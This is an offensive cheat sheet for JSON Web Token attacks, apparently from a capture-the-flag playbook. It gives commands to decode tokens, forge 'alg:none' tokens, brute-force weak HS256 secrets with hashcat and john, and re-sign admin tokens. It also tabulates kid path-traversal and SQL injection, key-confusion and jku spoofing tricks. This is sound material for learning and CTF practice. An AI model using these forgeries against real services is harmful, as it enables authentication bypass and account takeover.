# JWT attacks

**Signs**: token `eyJhbGciOi...` with two dots, in a cookie, `Authorization: Bearer`, JSON response,
or page `<code>`. Hints: "the badge you carry" (decode), "picks its own lock, say none" (`alg:none`),
"four digits" (weak secret).

## 1. Decode it (always first)
Payload is base64url — **encoded, not encrypted**.
```bash
python scripts/auth/jwt_tool_lite.py decode <token>
echo '<payload_part>' | tr '_-' '/+' | base64 -d 2>/dev/null; echo
```
Flag or secrets inside? Done (`leak6`). Note claims: `role`, `admin`, `user`, `partner`, `sub`, `exp`.

## 2. `alg: none` (verifier trusts the header)
```bash
python scripts/auth/jwt_tool_lite.py none <token> --set partner=admin
# → header {"alg":"none","typ":"JWT"}, your claims, empty signature: "xxx.yyy."
curl -s -H "Authorization: Bearer <forged>" $T/partner/admin
```
Variants if rejected: `"None"`, `"NONE"`, `"nOnE"`; keep/drop the trailing dot; original signature kept.

## 3. Weak HMAC secret (HS256)
```bash
python scripts/auth/jwt_tool_lite.py crack <token> --digits 4          # 0000-9999
python scripts/auth/jwt_tool_lite.py crack <token> -w wordlists/secrets/jwt-secrets.txt
hashcat -m 16500 token.txt wordlists/secrets/jwt-secrets.txt           # tools/hashcat-john.md
john --format=HMAC-SHA256 token.txt --wordlist=...                     # needs jwt2john format
# then forge
python scripts/auth/jwt_tool_lite.py sign <token> --secret 1234 --set role=admin
```

## 4. Other classic flaws
| Attack | Idea |
|---|---|
| Signature not checked at all | edit payload, keep old signature |
| RS256→HS256 confusion | sign HS256 with the **public key** as the HMAC secret (`jwt_tool -X k -pk pub.pem`) |
| `kid` injection | `"kid":"../../../../dev/null"` + empty secret; or SQLi in `kid` |
| `jku`/`x5u` header | point to your own JWKS |
| Expired token accepted | old tokens still work → replay |

Full tool: [tools/jwt_tool.md](../tools/jwt_tool.md).

Seen in: `leak6` (flag in payload), `auth7` (`alg:none`, `{"partner":"admin"}` →
`/partner/admin`), `auth8` (token in `token` cookie, 4-digit HS256 secret → `role: admin` →
`/accounts/admin`).
